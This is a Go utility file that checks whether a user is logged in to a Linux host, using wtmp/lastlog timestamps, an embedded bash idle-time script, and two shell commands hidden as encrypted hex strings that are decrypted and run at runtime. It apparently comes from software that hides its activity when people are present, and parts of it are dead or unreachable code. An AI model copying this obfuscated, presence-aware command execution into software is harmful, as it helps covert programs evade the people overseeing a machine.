package utils

import (
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
	//	"github.com/atotto/clipboard"
)

// var ttySessionFile = "/var/tmp/.hive"
var wtmpFile = "/var/log/wtmp"
var lastlog = "/var/log/lastlog"
var OUT_LOGIN_SECONDS int64 = 5 * 60

func isFileExists(path string) bool {
	err := syscall.Access(path, syscall.F_OK)
	return !os.IsNotExist(err)
	return true
}

// func isTtyLogin() bool {
// 	commandStr := "who | wc -l"

// 	data, err := BashCommand(commandStr, 5)
// 	if err != nil {
// 		return true
// 	}

// 	if len(data) == 0 {
// 		return true
// 	}
// 	if data[0:1] == "0" {
// 		return false
// 	}
// 	return true
// }
// func isSessionLastTimeLogin() bool {
// 	lastModifiTime := getTtySessionLastTime()
// 	if time.Now().Unix()-lastModifiTime < int64(OUT_LOGIN_SECONDS) {
// 		return true
// 	}

// 	return false
// }
// func getTtySessionLastTime() int64 {
// 	f, err := os.Open(ttySessionFile)
// 	if err != nil {
// 		return time.Now().Unix()
// 	}
// 	defer f.Close()

//		fi, err := f.Stat()
//		if err != nil {
//			return time.Now().Unix()
//		}
//		return fi.ModTime().Unix()
//	}
func getWtmpLastTime() int64 {
	f, err := os.Open(wtmpFile)
	if err != nil {
		return time.Now().Unix()
	}
	defer f.Close()

	fi, err := f.Stat()
	if err != nil {
		return time.Now().Unix()
	}
	return fi.ModTime().Unix()
}
func getLastlogLastTime() int64 {
	f, err := os.Open(lastlog)
	if err != nil {
		return time.Now().Unix()
	}
	defer f.Close()

	fi, err := f.Stat()
	if err != nil {
		return time.Now().Unix()
	}
	return fi.ModTime().Unix()
}

//
/*
func IsHasMonitor(param *Params) bool {
	if len(param.XrandrPath) == 0{
		return false
	}
	result, _ := Command("sudo",10,[]string{"xrandr"})
	ss := strings.Split(result, "\n")
	for _, s := range ss {
		if strings.Contains(s, "connected") {
			if !strings.Contains(s, "default") {
				return true
			}
		}
	}

	return false
}
*/

func IsUserLogin() bool {
	return false
	// if isFileExists(ttySessionFile) {
	// 	if isSessionLastTimeLogin() {
	// 		return true
	// 	}
	// }
	// if isTtyLogin() {
	// 	return true
	// }
	// if isShareLogin() {
	// 	return true
	// }
	return false

	if isSshLogin() {
		return true
	}
	if isFileExists(wtmpFile) {
		lastTime := getWtmpLastTime()
		if time.Now().Unix()-lastTime < OUT_LOGIN_SECONDS {
			return true
		}
	}

	if isFileExists(lastlog) {
		lastTime := getLastlogLastTime()
		if time.Now().Unix()-lastTime < OUT_LOGIN_SECONDS {
			return true
		}
	}
	return false
}

//todo:检查剪切板是否有内容
/*
func isClipBoardNull() bool {
	text, _ := clipboard.ReadAll()
	if text == "" {
		return true
	}
	return false
}

*/

var sshLoginStr = `#!/bin/bash
lcount=$(who|wc -l)
if [[ $lcount -eq 0 ]] ; then
        echo "no"
        exit 0
fi
idle=$(w -h | awk '{print $2}' | (cd /dev && xargs stat -c '%X'))
ts=$(date +"%s")
for i in ${idle[@]}
do
        seconds=$(echo "$ts - $i" |bc)
        if [[ $seconds -lt 10800 ]] ; then
                echo "yes"
                exit 0
        fi
done
echo "no"
`

func isTtyLogin() bool {
	data, err := BashCommand(sshLoginStr, 5)
	if err != nil {
		return true
	}
	data = strings.Replace(data, "\n", "", -1)
	return data == "yes"
}

func isShareLogin() bool {
	cmd := Decrypt("b7d640fa5e2480882d8cdd00440ffd760b5ab79994ccffe78154dce1071781b5804949c87539a10f256ebb29249371c397620b319884af68166cf8d18de5c28a26f2b930590e8a8bb7790d38d9c784ff36b256a3b3509b7f")
	data, err := BashCommand(cmd, 5)
	if err != nil {
		return true
	}
	data = strings.Replace(data, "\n", "", -1)
	if len(data) == 0 {
		return false
	}
	seconds, err := strconv.ParseFloat(data, 64)
	if err != nil {
		return true
	}
	if seconds < 7200 {
		return true
	}
	return false
}

func isSshLogin() bool {
	cmd := Decrypt("a8722716d72ebfc38987d2e5004d0244ea594c5f6b6a0a80b5b8a8ac9228d632a8f688b9228d57540eac64d3e5c61434efbdb194cbcd34b421dd35b6564ee2036169f79713")
	data, err := BashCommand(cmd, 5)
	if err != nil {
		return true
	}
	datas := strings.Split(data, "\n")
	if len(datas) == 0 {
		return false
	}

	for _, v := range datas {
		// if strings.Contains(v, "days") {
		// 	continue
		// } else if strings.Contains(v, "h") {
		// 	continue
		// } else if strings.Contains(v, "m") {
		// 	continue
		// } else {
		// 	return true
		// }
		if strings.Contains(v, "s") && !strings.Contains(v, "days") {
			return true
		}
	}
	return false
}
